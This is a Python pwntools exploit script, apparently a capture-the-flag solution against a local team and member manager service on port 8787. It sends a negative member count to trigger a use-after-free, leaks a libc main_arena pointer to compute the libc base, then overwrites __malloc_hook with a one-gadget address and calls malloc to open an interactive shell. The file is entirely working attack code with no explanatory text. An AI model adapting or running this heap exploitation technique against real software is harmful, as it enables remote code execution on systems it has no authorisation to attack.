from pwn import *

gadget = 0x4647c

def leak(r):
    # 1. Create Team
    r.recvuntil(">")
    r.send("1")
    r.recvuntil(":")
    r.send("0")
    
    # 3. Manager Team
    r.recvuntil(">")
    r.send("3")
    r.recvuntil(":")
    r.send("0")
    
    # 1. Add Member
    r.recvuntil(">")
    r.send("1")
    r.recvuntil(":")
    r.send("16")
    for i in range(16):
        r.recvuntil(":")
        r.send("name")
        r.recvuntil(":")
        r.send("desc")
    
    # VULN!
    r.recvuntil(">")
    r.send("1")
    r.recvuntil(":")
    r.send("-16")
    
    # UAF
    r.recvuntil(">")
    r.send("5")
    r.recvuntil(">")
    r.send("1")
    r.recvuntil(":")
    r.send("128")
    r.recvuntil(":")
    r.send("aaaaaaaa")
    
    # leak
    r.recvuntil(">")
    r.send("4")
    description = r.recvuntil(">")
    start = description.find("aaaaaaaa")
    end = description[start:].find("Size :")
    _main_arena_88 = description[start+8:start+end].ljust(8, "\x00")
    main_arena_88 = u64(_main_arena_88)
    libc_base = main_arena_88 - 0x3be7b8
    print("libc_base :", hex(libc_base))
    malloc_hook = main_arena_88 - 88 - 0x20
    
    return libc_base, malloc_hook
    
    
def exploit(r, libc_base, exec_point):
    ## realloc(description1, 0)
    # 3. Manager Team
    r.send("3")
    r.recvuntil(":")
    r.send("0")
    
    # VULN!
    r.recvuntil(">")
    r.send("1")
    r.recvuntil(":")
    r.send("-16")
    
    # UAF & fill exec_point to description1
    r.recvuntil(">")
    r.send("5")
    r.recvuntil(">")
    r.send("1")
    r.recvuntil(":")
    r.send("128")
    r.recvuntil(":")
    r.send(p64(exec_point))
    
    # 3. Manager Team
    r.recvuntil(">")
    r.send("3")
    r.recvuntil(":")
    r.send("0")
    
    # 4. Manager Member & write gadget to exec_point
    r.recvuntil(">")
    r.send("4")
    r.recvuntil(":")
    r.send("0")    # exec_point
    r.recvuntil(":")
    global gadget
    gadget += libc_base
    r.send(p64(gadget))
    
    # call malloc() -> malloc_hook
    r.recvuntil(">")
    r.send("5")
    r.recvuntil(">")
    r.send("1")
    r.recvuntil(":")
    r.send("0")
    
    r.interactive()
    
    
if __name__ == "__main__":
    r = remote("127.0.0.1", 8787)
    
    libc_base, malloc_hook = leak(r)
    exploit(r, libc_base, malloc_hook)
    